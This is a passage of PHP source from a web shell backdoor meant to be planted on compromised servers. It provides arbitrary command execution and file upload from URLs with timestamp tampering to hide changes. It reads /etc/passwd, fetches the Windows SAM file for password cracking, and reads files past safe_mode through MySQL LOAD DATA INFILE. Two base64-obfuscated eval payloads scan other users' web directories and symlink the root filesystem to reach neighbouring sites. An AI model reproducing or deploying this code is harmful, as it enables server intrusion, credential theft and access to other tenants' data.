       echo "<td>&nbsp;<a href=\"".$sql_surl."sql_x=query&sql_query=".urlencode("DELETE FROM `".$row["Name"]."`")."\"><img src=\"".$surl."x=img&img=sql_button_empty\" alt=\"Empty\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;&nbsp;<a href=\"".$sql_surl."sql_x=query&sql_query=".urlencode("DROP TABLE `".$row["Name"]."`")."\"><img src=\"".$surl."x=img&img=sql_button_drop\" alt=\"Drop\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;<a href=\"".$sql_surl."sql_tbl_x=insert&sql_tbl=".$row["Name"]."\"><img src=\"".$surl."x=img&img=sql_button_insert\" alt=\"Insert\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;</td>";
       echo "</tr>";
       $i++;
      }
      echo "<tr bgcolor=\"000000\">";
      echo "<td><center><b>+</b></center></td>";
      echo "<td><center><b>".$i." table(s)</b></center></td>";
      echo "<td><b>".$trows."</b></td>";
      echo "<td>".$row[1]."</td>";
      echo "<td>".$row[10]."</td>";
      echo "<td>".$row[11]."</td>";
      echo "<td><b>".view_size($tsize)."</b></td>";
      echo "<td></td>";
      echo "</tr>";
      echo "</table><hr size=\"1\" noshade><p align=\"right\"><img src=\"".$surl."x=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_x\">";
      echo "<option value=\"\">With selected:</option>";
      echo "<option value=\"tbldrop\">Drop</option>";
      echo "<option value=\"tblempty\">Empty</option>";
      echo "<option value=\"tbldump\">Dump</option>";
      echo "<option value=\"tblcheck\">Check table</option>";
      echo "<option value=\"tbloptimize\">Optimize table</option>";
      echo "<option value=\"tblrepair\">Repair table</option>";
      echo "<option value=\"tblanalyze\">Analyze table</option>";
      echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>";
      mysql_free_result($result);
     }
    }
   }
   }
  }
  else {
   $acts = array("","newdb","serverstatus","servervars","processes","getfile");
   if (in_array($sql_x,$acts)) {?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="x" value="sql"><input type="hidden" name="sql_x" value="newdb"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newdb" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>View File:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="x" value="sql"><input type="hidden" name="sql_x" value="getfile"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>">&nbsp;<input type="submit" value="Get"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php }
   if (!empty($sql_x)) {
    echo "<hr size=\"1\" noshade>";
    if ($sql_x == "newdb") {
     echo "<b>";
     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";}
     else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
    }
    if ($sql_x == "serverstatus") {
     $result = mysql_query("SHOW STATUS", $sql_sock);
     echo "<center><b>Server-status variables:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=0 bgcolor=#000000 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
     echo "</table></center>";
     mysql_free_result($result);
    }
    if ($sql_x == "servervars") {
     $result = mysql_query("SHOW VARIABLES", $sql_sock);
     echo "<center><b>Server variables:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=0 bgcolor=#000000 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
     echo "</table>";
     mysql_free_result($result);
    }
    if ($sql_x == "processes") {
     if (!empty($kill)) {
       $query = "KILL ".$kill.";";
       $result = mysql_query($query, $sql_sock);
       echo "<b>Process #".$kill." was killed.</b>";
     }
     $result = mysql_query("SHOW PROCESSLIST", $sql_sock);
     echo "<center><b>Processes:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=2 borderColorLight=#333333 border=1><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td><td><b>Action</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"".$sql_surl."sql_x=processes&kill=".$row[0]."\"><u>Kill</u></a></td></tr>";}
     echo "</table>";
     mysql_free_result($result);
    }
    if ($sql_x == "getfile")
    {
     $tmpdb = $sql_login."_tmpdb";
     $select = mysql_select_db($tmpdb);
     if (!$select) {mysql_create_db($tmpdb); $select = mysql_select_db($tmpdb); $created = !!$select;}
     if ($select)
     {
      $created = FALSE;
      mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
      mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");
      $result = mysql_query("SELECT * FROM tmp_file;");
      if (!$result) {echo "<b>Error in reading file (permision denied)!</b>";}
      else
      {
       for ($i=0;$i<mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}
       $f = "";
       while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {$f .= join ("\r\n",$row);}
       if (empty($f)) {echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b><br>";}
       else {echo "<b>File \"".$sql_getfile."\":</b><br>".nl2br(htmlspecialchars($f))."<br>";}
       mysql_free_result($result);
       mysql_query("DROP TABLE tmp_file;");
      }
     }
     mysql_drop_db($tmpdb); 
    }
   }
  }
}
echo "</td></tr></table>";
if ($sql_sock) {
  $affected = @mysql_affected_rows($sql_sock);
  if ((!is_numeric($affected)) or ($affected < 0)){$affected = 0;}
  echo "<tr><td><center><b>Affected rows : ".$affected."</center></td></tr>";
}
echo "</table>";
}
if ($x == "phpinfo") {@ob_clean(); phpinfo(); bogelexit();}
if ($x == "security") {
  echo "<div class=barheader>.: Server Security Information :.</div>".
       "<table>".
       "<tr><td>Open Base Dir</td><td>".$hopenbasedir."</td></tr>";
  echo "<td>Password File</td><td>";
  if (!$win) {
    if ($nixpasswd) {
      if ($nixpasswd == 1) {$nixpasswd = 0;}
      echo "*nix /etc/passwd:<br>";
      if (!is_numeric($nixpwd_s)) {$nixpwd_s = 0;}
      if (!is_numeric($nixpwd_e)) {$nixpwd_e = $nixpwdperpage;}
      echo "<form action=\"".$surl."\"><input type=hidden name=x value=\"security\"><input type=hidden name=\"nixpasswd\" value=\"1\"><b>From:</b>&nbsp;<input type=\"text=\" name=\"nixpwd_s\" value=\"".$nixpwd_s."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"nixpwd_e\" value=\"".$nixpwd_e."\">&nbsp;<input type=submit value=\"View\"></form><br>";
      $i = $nixpwd_s;
      while ($i < $nixpwd_e) {
        $uid = posix_getpwuid($i);
        if ($uid) {
          $uid["dir"] = "<a href=\"".$surl."x=ls&d=".urlencode($uid["dir"])."\">".$uid["dir"]."</a>";
          echo join(":",$uid)."<br>";
        }
        $i++;
      }
    }
    else {echo "<a href=\"".$surl."x=security&nixpasswd=1&d=".$ud."\"><b><u>Get /etc/passwd</u></b></a>";}
  }
  else {
    $v = $_SERVER["WINDIR"]."\repair\sam";
    if (file_get_contents($v)) {echo "<td colspan=2><div class=fxerrmsg>You can't crack Windows passwords(".$v.")</div></td></tr>"; }
    else {echo "You can crack Windows passwords. <a href=\"".$surl."x=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><u><b>Download</b></u></a>, and use lcp.crack+ ?.</td></tr>";}
  }
  echo "</td></tr>";
  echo "<tr><td>Config Files</td><td>";
  if (!$win) {
    $v = array(
        array("User Domains","/etc/userdomains"),
        array("Cpanel Config","/var/cpanel/accounting.log"),
        array("Apache Config","/usr/local/apache/conf/httpd.conf"),
        array("Apache Config","/etc/httpd.conf"),
        array("Syslog Config","/etc/syslog.conf"),
        array("Message of The Day","/etc/motd"),
        array("Hosts","/etc/hosts")
    );
    $sep = "/";
  }
  else {
    $windir = $_SERVER["WINDIR"];
    $etcdir = $windir . "\system32\drivers\etc\\";
    $v = array(
        array("Hosts",$etcdir."hosts"),
        array("Local Network Map",$etcdir."networks"),
        array("LM Hosts",$etcdir."lmhosts.sam"),
    );
    $sep = "\\";
  }
  foreach ($v as $sec_arr) {
    $sec_f = substr(strrchr($sec_arr[1], $sep), 1);
    $sec_d = rtrim($sec_arr[1],$sec_f);
    $sec_full = $sec_d.$sec_f;
    $sec_d = rtrim($sec_d,$sep);
    if (file_get_contents($sec_full)) {
      echo " [ <a href=\"".$surl."x=f&f=$sec_f&d=".urlencode($sec_d)."&ft=txt\"><u><b>".$sec_arr[0]."</b></u></a> ] ";
    }
  }
  echo "</td></tr>";

  function displaysecinfo($name,$value) {
    if (!empty($value)) {
      echo "<tr><td>".$name."</td><td><pre>".wordwrap($value,100)."</pre></td></tr>";
    }
  }
  if (!$win) {
    displaysecinfo("OS Version",myshellexec("cat /proc/version"));
    displaysecinfo("Kernel Version",myshellexec("sysctl -a | grep version"));
    displaysecinfo("Distrib Name",myshellexec("cat /etc/issue"));
    displaysecinfo("Distrib Name (2)",myshellexec("cat /etc/issue.rpmnew"));
    displaysecinfo("CPU Info",myshellexec("cat /proc/cpuinfo"));
    displaysecinfo("RAM",myshellexec("free -m"));
    displaysecinfo("HDD Space",myshellexec("df -h"));
    displaysecinfo("List of Attributes",myshellexec("lsattr -a"));
    displaysecinfo("Mount Options",myshellexec("cat /etc/fstab"));
    displaysecinfo("cURL installed?",myshellexec("which curl"));
	displaysecinfo("lynx installed?",myshellexec("which lynx"));
    displaysecinfo("links installed?",myshellexec("which links"));
    displaysecinfo("fetch installed?",myshellexec("which fetch"));
    displaysecinfo("GET installed?",myshellexec("which GET"));
    displaysecinfo("perl installed?",myshellexec("which perl"));
    displaysecinfo("Where is Apache?",myshellexec("whereis apache"));
    displaysecinfo("Where is perl?",myshellexec("whereis perl"));
    displaysecinfo("Locate proftpd.conf",myshellexec("locate proftpd.conf"));
    displaysecinfo("Locate httpd.conf",myshellexec("locate httpd.conf"));
    displaysecinfo("Locate my.conf",myshellexec("locate my.conf"));
    displaysecinfo("Locate psybnc.conf",myshellexec("locate psybnc.conf"));
  }
  else {
    displaysecinfo("OS Version",myshellexec("ver"));
    displaysecinfo("Account Settings",myshellexec("net accounts"));
  }
  echo "</table>\n";
}

if ($x == "jump") {
$ngipmuj = base64_decode("YmFyX2hlYWRlcigiLjogSnVtcGluZyA6LiIpOw0KCSgkc20gPSBpbmlfZ2V0KCdzYWZlX21vZGUnKSA9PSAwKSA/ICRzbSA9ICdvZmYnOiBkaWUoJzxmb250IHNpemU9IjQiIGNvbG9yPSIjMDAwMDAwIiBmYWNlPSJDYWxpYnJpIj48Yj5FcnJvcjogU2FmZV9tb2RlID0gT248L2I+PC9mb250PicpOw0Kc2V0X3RpbWVfbGltaXQoMCk7DQpAJHBhc3N3ZCA9IGZvcGVuKCcvZXRjL3Bhc3N3ZCcsJ3InKTsNCmlmICghJHBhc3N3ZCkgeyBkaWUoJzxmb250IHNpemU9IjQiIGNvbG9yPSIjMDAwMDAwIiBmYWNlPSJDYWxpYnJpIj48Yj5bLV0gRXJyb3IgOiBDb3VkbmB0IFJlYWQgL2V0Yy9wYXNzd2Q8L2I+PC9mb250PicpOyB9DQokcHViID0gYXJyYXkoKTsNCiR1c2VycyA9IGFycmF5KCk7DQokY29uZiA9IGFycmF5KCk7DQokaSA9IDA7DQp3aGlsZSghZmVvZigkcGFzc3dkKSkNCnsNCiRzdHIgPSBmZ2V0cygkcGFzc3dkKTsNCmlmICgkaSA+IDEwMCkNCnsNCiAgJHBvcyA9IHN0cnBvcygkc3RyLCc6Jyk7DQogICR1c2VybmFtZSA9IHN1YnN0cigkc3RyLDAsJHBvcyk7DQogICRkaXJ6ID0gJy9ob21lLycuJHVzZXJuYW1lLicvcHVibGljX2h0bWwvJzsNCiAgaWYgKCgkdXNlcm5hbWUgIT0gJycpKQ0KICB7DQogICBpZiAoaXNfcmVhZGFibGUoJGRpcnopKQ0KICAgew0KICAgIGFycmF5X3B1c2goJHVzZXJzLCR1c2VybmFtZSk7DQogICAgYXJyYXlfcHVzaCgkcHViLCRkaXJ6KTsNCiAgIH0NCiAgfQ0KICAgfQ0KJGkrKzsNCn0NCmVjaG8gIlxuIDxmb250IHNpemU9JzMnIGNvbG9yPScjMDA4MDgwJyBmYWNlPSdDYWxpYnJpJz48YnI+Wy1dPT09PT09PT09PT09PT09PT09WyBTVEFSVCBdPT09PT09PT09PT09PT09PT09Wy1dICA8YnI+PC9mb250PlxuIjsNCmZvcmVhY2ggKCR1c2VycyBhcyAkdXNlcikNCnsNCmVjaG8gIjxmb250IHNpemU9JzMnIGNvbG9yPScjZWUwODA4JyBmYWNlPSdDYWxpYnJpJz4gWytdIC9ob21lLyR1c2VyL3B1YmxpY19odG1sLzwvZm9udD48YnIvPiI7DQp9DQplY2hvICJcbiA8Zm9udCBzaXplPSczJyBjb2xvcj0nIzAwODA4MCcgZmFjZT0nQ2FsaWJyaSc+PGJyPlstXT09PT09PT09PT09PT09PT09PVsgRklOSVNIIF09PT09PT09PT09PT09PT09PT1bLV0gPGJyPjwvZm9udD5cbiI7DQplY2hvICJcbiA8Zm9udCBzaXplPScyJyBjb2xvcj0nIzgwMDAwMCcgZmFjZT0nQ2FsaWJyaSc+SnVtcGluZyBTY2FubmVyIGlzIENvbXBsZXRlZCE8L2ZvbnQ+XG4iOw==");
eval ($ngipmuj);
}

if ($x == "sym") {
$knilmys = base64_decode("QHNldF90aW1lX2xpbWl0KDApOw0KJHJ4MSA9ICdodHRwOi8vJy4kX1NFUlZFUlsnU0VSVkVSX05BTUUnXS4kX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsNCiRyeDIgPWV4cGxvZGUoJy8nLCRyeDEgKTsNCiRyeDEgPXN0cl9yZXBsYWNlKCRyeDJbY291bnQoJHJ4MiktMV0sJycsJHJ4MSApOw0KDQpAbWtkaXIoJ3N5bScsMDc3Nyk7DQokcngxICA9ICJPcHRpb25zIGFsbCBcbiBEaXJlY3RvcnlJbmRleCBTdXguaHRtbCBcbiBBZGRUeXBlIHRleHQvcGxhaW4gLnBocCBcbiBBZGRIYW5kbGVyIHNlcnZlci1wYXJzZWQgLnBocCBcbiAgQWRkVHlwZSB0ZXh0L3BsYWluIC5odG1sIFxuIEFkZEhhbmRsZXIgdHh0IC5odG1sIFxuIFJlcXVpcmUgTm9uZSBcbiBTYXRpc2Z5IEFueSI7DQokcngyID1AZm9wZW4gKCdzeW0vLmh0YWNjZXNzJywndycpOw0KZndyaXRlKCRyeDIgLCRyeDEpOw0KQHN5bWxpbmsoJy8nLCdzeW0vcm9vdCcpOw0KaWYoaXNzZXQoJF9SRVFVRVNUWyd4J10pKQ0Kew0Kc3dpdGNoICgkX1JFUVVFU1RbJ3gnXSkNCnsNCmNhc2UgJ3N5bSc6DQokcng0ID0gQGZpbGUoJy9ldGMvbmFtZWQuY29uZicpOw0KaWYoISRyeDQpDQp7DQpkaWUgKCIgY2FuJ3QgcmVhZCAvZXRjL25hbWVkLmNvbmYiKTsNCn0NCmVsc2UNCnsNCmVjaG8gIjxkaXYgY2xhc3M9J3RtcCc+PHRhYmxlIGFsaWduPSdjZW50ZXInIHdpZHRoPSc0MCUnPjx0ZD5Eb21haW5zPC90ZD48dGQ+VXNlcnM8L3RkPjx0ZD5TeW1saW5rIDwvdGQ+IjsNCmZvcmVhY2goJHJ4NCBhcyAkcng1KXsNCmlmKGVyZWdpKCd6b25lJywkcng1KSl7DQpwcmVnX21hdGNoX2FsbCgnI3pvbmUgIiguKikiIycsJHJ4NSwkcng2KTsNCmZsdXNoKCk7DQppZihzdHJsZW4odHJpbSgkcng2WzFdWzBdKSkgPjIpew0KJHJ4NyA9IHBvc2l4X2dldHB3dWlkKEBmaWxlb3duZXIoJy9ldGMvdmFsaWFzZXMvJy4kcng2WzFdWzBdKSk7DQokcng4ID0gJHJ4N1snbmFtZSddIDsNCkBzeW1saW5rKCcvJywnc3ltL3Jvb3QnKTsNCiRyeDggPSAkcng2WzFdWzBdOw0KJHJ4OSA9ICdcLmlyJzsNCiRyeDEwID0gJ1wuaWwnOw0KaWYgKGVyZWdpKCIkcng5Iiwkcng2WzFdWzBdKSBvciBlcmVnaSgiJHJ4MTAiLCRyeDZbMV1bMF0pICkNCnsNCiRyeDggPSAiPGRpdiBzdHlsZT0nIGNvbG9yOiAjRkYwMDAwIDsgdGV4dC1zaGFkb3c6IDBweCAwcHggMXB4IHJlZDsgJz4iLiRyeDZbMV1bMF0uJzwvZGl2Pic7DQp9DQplY2hvICINCjx0cj4NCg0KPHRkPg0KPGRpdiBjbGFzcz0nZG9tJz48YSB0YXJnZXQ9J19ibGFuaycgaHJlZj1odHRwOi8vd3d3LiIuJHJ4NlsxXVswXS4nLz4nLiRyeDguJyA8L2E+IDwvZGl2Pg0KPC90ZD4NCg0KDQo8dGQ+DQonLiRyeDdbJ25hbWUnXS4iDQo8L3RkPg0KDQo8dGQ+DQo8YSBocmVmPSdzeW0vcm9vdC9ob21lLyIuJHJ4N1snbmFtZSddLiIvcHVibGljX2h0bWwnIHRhcmdldD0nX2JsYW5rJz5zeW1saW5rIDwvYT4NCjwvdGQ+DQoNCjwvdHI+PC9kaXY+ICI7DQpmbHVzaCgpOw0KfQ0KfQ0KfQ0KfQ0KfQ0KfQ==");
eval ($knilmys);
}

if ($x == "mkfile") {
if ($mkfile != $d) {
  if (file_exists($mkfile)) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: object already exists!";}
  elseif (!fopen($mkfile,"w")) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: access denied!";}
  else {$x = "f"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} $f = basename($mkfile);}
}
else {$x = $dspact = "ls";}

}
if ($x == "chmod") {
  $mode = fileperms($d.$f);
  if (!$mode) {echo "<b>Change file-mode with error:</b> can't get current value.";}
  else {
    $form = TRUE;
    if ($chmod_submit)
  {
   $octet = "0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8);
   if (chmod($d.$f,$octet)) {$x = "ls"; $form = FALSE; $err = "";}
   else {$err = "Can't chmod to ".$octet.".";}
  }
  if ($form)
  {
   $perms = parse_perms($mode);
   echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b><br>".($err?"<b>Error:</b> ".$err:"")."<form action=\"".$surl."\" method=POST><input type=hidden name=d value=\"".htmlspecialchars($d)."\"><input type=hidden name=f value=\"".htmlspecialchars($f)."\"><input type=hidden name=x value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"").">eXecute</td><td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"").">eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"").">eXecute</font></td></tr><tr><td><input type=submit name=chmod_submit value=\"Save\"></td></tr></table></form>";
  }
}
}
if ($x == "upload") {
  $uploadmess = "";
  $uploadpath = str_replace("\\",DIRECTORY_SEPARATOR,$uploadpath);
  if (empty($uploadpath)) {$uploadpath = $d;}
  elseif (substr($uploadpath,-1) != DIRECTORY_SEPARATOR) {$uploadpath .= DIRECTORY_SEPARATOR;}
  if (!empty($submit)) {
    global $_FILES;
    $uploadfile = $_FILES["uploadfile"];
    if (!empty($uploadfile["tmp_name"])) {
      if (empty($uploadfilename)) {$destin = $uploadfile["name"];}
      else {$destin = $userfilename;}
      if (!move_uploaded_file($uploadfile["tmp_name"],$uploadpath.$destin)) {
        $uploadmess .= "Error uploading file ".$uploadfile["name"]." (can't copy \"".$uploadfile["tmp_name"]."\" to \"".$uploadpath.$destin."\"!<br>";
      }
      else { $uploadmess .= "File uploaded successfully!<br>".$uploadpath.$destin; }
    }
    elseif (!empty($uploadurl)) {
      if (!empty($uploadfilename)) {$destin = $uploadfilename;}
      else {
        $destin = explode("/",$destin);
        $destin = $destin[count($destin)-1];
        if (empty($destin)) {
          $i = 0;
          $b = "";
          while(file_exists($uploadpath.$destin)) {
            if ($i > 0) {$b = "_".$i;}
            $destin = "upload".$b;
            $i++;
          }
        }
      }
      if ((!eregi("http://",$uploadurl)) and (!eregi("https://",$uploadurl)) and (!eregi("ftp://",$uploadurl))) {echo "<b>Incorrect URL!</b>";}
      else {
        $st = getmicrotime();
        $content = @file_get_contents($uploadurl);
        $dt = round(getmicrotime()-$st,4);
        if (!$content) {$uploadmess .=  "Can't download file!";}
        else {
          if ($filestealth) {$stat = stat($uploadpath.$destin);}
          $fp = fopen($uploadpath.$destin,"w");
          if (!$fp) {$uploadmess .= "Error writing to file ".htmlspecialchars($destin)."!<br>";}
          else {
            fwrite($fp,$content,strlen($content));
            fclose($fp);
            if ($filestealth) {touch($uploadpath.$destin,$stat[9],$stat[8]);}
            $uploadmess .= "File saved from ".$uploadurl." !";
          }
        }
      }
    }
    else { echo "No file to upload!"; }
  }
  if ($miniform) {
    echo "<b>".$uploadmess."</b>";
    $x = "ls";
  }
  else {
    echo "<table><tr><td colspan=2 class=barheader>".
         ".: File Upload :.</td>".
         "<td colspan=2>".$uploadmess."</td></tr>".
         "<tr><td><form enctype=\"multipart/form-data\" action=\"".$surl."x=upload&d=".urlencode($d)."\" method=POST>".
         "From Your Computer:</td><td><input name=\"uploadfile\" type=\"file\"></td></tr>".
         "<tr><td>From URL:</td><td><input name=\"uploadurl\" type=\"text\" value=\"".htmlspecialchars($uploadurl)."\" size=\"70\"></td></tr>".
         "<tr><td>Target Directory:</td><td><input name=\"uploadpath\" size=\"70\" value=\"".$dispd."\"></td></tr>".
         "<tr><td>Target File Name:</td><td><input name=uploadfilename size=25></td></tr>".
         "<tr><td></td><td><input type=checkbox name=uploadautoname value=1 id=df4> Convert file name to lowercase</td></tr>".
         "<tr><td></td><td><input type=submit name=submit value=\"Upload\">".
         "</form></td></tr></table>";
  }
}
if ($x == "delete") {
  $delerr = "";
  foreach ($actbox as $v) {
    $result = FALSE;
    $result = fs_rmobj($v);
    if (!$result) {$delerr .= "Can't delete ".htmlspecialchars($v)."<br>";}
  }
  if (!empty($delerr)) {echo "<b>Deleting with errors:</b><br>".$delerr;}
  $x = "ls";
}
if (!$usefsbuff) {
  if (($x == "paste") or ($x == "copy") or ($x == "cut") or ($x == "unselect")) {echo "<center><b>Sorry, buffer is disabled. For enable, set directive \"\$usefsbuff\" as TRUE.</center>";}
}
else {
  if ($x == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); ca_sess_put($sess_data); $x = "ls"; }
  elseif ($x == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); ca_sess_put($sess_data); $x = "ls";}
  elseif ($x == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} ca_sess_put($sess_data); $x = "ls";}
  if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); ca_sess_put($sess_data);}
  elseif ($actpastebuff) {
    $psterr = "";
    foreach($sess_data["copy"] as $k=>$v) {
      $to = $d.basename($v);
      if (!fs_copy_obj($v,$to)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
      if ($copy_unset) {unset($sess_data["copy"][$k]);}
    }
    foreach($sess_data["cut"] as $k=>$v) {
      $to = $d.basename($v);
      if (!fs_move_obj($v,$to)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
      unset($sess_data["cut"][$k]);
    }
    ca_sess_put($sess_data);
    if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
    $x = "ls";
  }
  elseif ($actarcbuff) {
    $arcerr = "";
    if (substr($actarcbuff_path,-7,7) == ".tar.gz") {$ext = ".tar.gz";}
    else {$ext = ".tar.gz";}
    if ($ext == ".tar.gz") {$cmdline = "tar cfzv";}
    $cmdline .= " ".$actarcbuff_path;
    $objects = array_merge($sess_data["copy"],$sess_data["cut"]);
    foreach($objects as $v) {
      $v = str_replace("\\",DIRECTORY_SEPARATOR,$v);
      if (substr($v,0,strlen($d)) == $d) {$v = basename($v);}
      if (is_dir($v)) {
        if (substr($v,-1) != DIRECTORY_SEPARATOR) {$v .= DIRECTORY_SEPARATOR;}
        $v .= "*";
      }
      $cmdline .= " ".$v;
    }
    $tmp = realpath(".");
    chdir($d);
    $ret = myshellexec($cmdline);
    chdir($tmp);
    if (empty($ret)) {$arcerr .= "Can't call archivator (".htmlspecialchars(str2mini($cmdline,60)).")!<br>";}
    $ret = str_replace("\r\n","\n",$ret);
    $ret = explode("\n",$ret);
    if ($copy_unset) {foreach($sess_data["copy"] as $k=>$v) {unset($sess_data["copy"][$k]);}}
    foreach($sess_data["cut"] as $k=>$v) {
      if (in_array($v,$ret)) {fs_rmobj($v);}
      unset($sess_data["cut"][$k]);
    }
    ca_sess_put($sess_data);
    if (!empty($arcerr)) {echo "<b>Archivation errors:</b><br>".$arcerr;}
    $x = "ls";
  }
  elseif ($actpastebuff) {
    $psterr = "";
    foreach($sess_data["copy"] as $k=>$v) {
      $to = $d.basename($v);
      if (!fs_copy_obj($v,$d)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
      if ($copy_unset) {unset($sess_data["copy"][$k]);}
    }
    foreach($sess_data["cut"] as $k=>$v) {
      $to = $d.basename($v);
      if (!fs_move_obj($v,$d)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
      unset($sess_data["cut"][$k]);
    }
    ca_sess_put($sess_data);
    if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
    $x = "ls";
  }
}
if ($x == "cmd") {
  @chdir($chdir);
  if (!empty($submit)) {
    echo "<div class=barheader>.: Result of Command Execution :.</div>";
    $olddir = realpath(".");
    @chdir($d);
    $ret = myshellexec($cmd);
    $ret = convert_cyr_string($ret,"d","w");
    if ($cmd_txt) {
      $rows = count(explode("\r\n",$ret))+1;
      if ($rows < 10) {$rows = 10; }
      if ($msie) { $cols = 113; }
      else { $cols = 117;}
      echo "<div align=left><pre>".htmlspecialchars($ret)."</pre></div>";
    }
    else {echo $ret."<br>";}
    @chdir($olddir);
  }
  else {
    echo "<b>Command Execution</b>";
    if (empty($cmd_txt)) {$cmd_txt = TRUE;}
  }
}
if ($x == "ls") {
  if (count($ls_arr) > 0) { $list = $ls_arr; }
  else {
    $list = array();
    if ($h = @opendir($d)) {
      while (($o = readdir($h)) !== FALSE) {$list[] = $d.$o;}
      closedir($h);
    }
  }
  if (count($list) == 0) { echo "<div class=fxerrmsg>Can't open folder (".htmlspecialchars($d).")!</div>";}
  else {
    $objects = array();
    $vd = "f"; 
    if ($vd == "f") {
      $objects["head"] = array();
      $objects["folders"] = array();
      $objects["links"] = array();
      $objects["files"] = array();
      foreach ($list as $v) {
        $o = basename($v);
        $row = array();
        if ($o == ".") {$row[] = $d.$o; $row[] = "CURDIR";}
        elseif ($o == "..") {$row[] = $d.$o; $row[] = "UPDIR";}
        elseif (is_dir($v)) {
          if (is_link($v)) {$type = "LINK";}
          else {$type = "DIR";}
          $row[] = $v;
          $row[] = $type;
        }
        elseif(is_file($v)) {$row[] = $v; $row[] = filesize($v);}
        $row[] = filemtime($v);
        if (!$win) {
